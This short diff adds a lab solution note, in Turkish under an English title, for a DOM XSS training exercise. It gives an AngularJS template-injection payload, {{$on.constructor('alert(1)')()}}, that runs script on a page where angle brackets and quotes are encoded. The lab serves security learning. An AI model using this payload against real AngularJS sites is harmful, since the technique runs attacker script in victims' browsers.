@@ -1,0 +1,8 @@
+LAB: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
+
+1 - Herhangi bir sayı girip aratın.
+
+<body ng-app>
+
+2 - Arama yerine aşağıdaki payloadı girin.
+{{$on.constructor('alert(1)')()}}
